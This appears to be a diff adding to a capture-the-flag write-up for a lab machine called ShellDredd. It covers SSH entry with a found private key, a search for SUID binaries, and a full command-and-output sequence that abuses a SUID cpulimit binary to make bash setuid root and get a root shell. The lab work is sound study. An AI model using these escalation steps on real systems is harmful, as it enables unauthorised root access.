@@ -38,3 +38,42 @@ PORT      STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 This might be a good indicator that I need to bruteforce for ssh logon credentials or atleast the ones I can use with ftp.
+
+Listing hidden directories, allowed me to access the private key in hannah directory.
+I ssh in over the open port 61000 and get access to user flag.
+
+Trying to lis commands on the system is restricted. I therefore proceed to check any file with SUID bit set.
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/cpulimit
+/usr/bin/mount
+/usr/bin/passwd
+
+After researching, of interest is the cpulimit binary. I head over to GTFOBINs and check what I can find.
+Using the command below am able to break away from the restricted shell but sudo command not found still. Needs to dig deeper
+cpulimit -l 100 -f /bin/sh
+++++++++++++++++++++++++
+After further research I realized one has to append the cpulimit command to each command as below to eventually get root:
+
+$ cpulimit -l 100 -f mkdir /test
+Process 7766 detected
+Child process is finished, exiting...
+$ cpulimit -l 100 -f chmod 4755 /usr/bin/bash
+Process 7768 detected
+Child process is finished, exiting...
+$ cpulimit -l 100 -f cp /usr/bin/bash /test
+Process 7770 detected
+Child process is finished, exiting...
+$ cd /test
+$ ls
+bash
+hannah@ShellDredd:/test$ cpulimit -l 100 -f chmod +s /test/bash
+Process 7779 detected
+Child process is finished, exiting...
+hannah@ShellDredd:/test$ ./bash -p
+bash-5.0# id
+uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root)
+
+And finally I get the roor flag and that is the box!
